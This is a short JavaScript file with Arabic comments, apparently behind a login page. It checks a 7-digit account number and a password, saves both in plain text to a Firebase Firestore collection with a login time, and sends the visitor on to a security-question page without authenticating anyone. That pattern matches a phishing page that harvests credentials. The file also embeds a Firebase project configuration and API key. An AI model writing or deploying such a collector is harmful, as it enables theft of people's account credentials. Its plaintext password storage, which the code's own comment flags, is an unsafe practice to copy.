// Firebase SDK
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";

// إعدادات Firebase
const firebaseConfig = {
  apiKey: "AIzaSyB8EntKIzd3OfSTqhghCLm68iVwt5WaIRU",
  authDomain: "project-id-77eb2.firebaseapp.com",
  projectId: "project-id-77eb2",
  storageBucket: "project-id-77eb2.appspot.com",
  messagingSenderId: "1061898051036",
  appId: "1:1061898051036:web:0eda29a129b8fce871c319"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// عناصر الصفحة
const loginForm = document.getElementById('loginForm');
const togglePasswordBtn = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');

// إظهار/إخفاء كلمة المرور
togglePasswordBtn.addEventListener('click', () => {
  const type = passwordInput.type === 'password' ? 'text' : 'password';
  passwordInput.type = type;
  togglePasswordBtn.textContent = type === 'password' ? '👁️' : '🙈';
});

// معالجة تسجيل الدخول
loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const userID = document.getElementById('userID').value.trim();
  const password = passwordInput.value.trim();

  // تحقق بسيط
  if (!/^\d{7}$/.test(userID)) {
    alert('رقم الحساب يجب أن يكون 7 أرقام');
    return;
  }
  if (password.length < 8) {
    alert('كلمة المرور يجب أن تكون 8 أحرف على الأقل');
    return;
  }

  // حفظ رقم الحساب في localStorage لاستخدامه في صفحة سؤال الأمان
  localStorage.setItem('userID', userID);

  try {
    // حفظ بيانات تسجيل الدخول في Firebase
    await setDoc(doc(db, "users", userID), {
      userID: userID,
      password: password, // في مشروع حقيقي لا تحفظ الباسورد نص واضح!
      loginTime: new Date()
    });

    // تحويل لصفحة سؤال الأمان
    window.location.href = "security-question.html";
  } catch (err) {
    console.error(err);
    alert("حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.");
  }
});
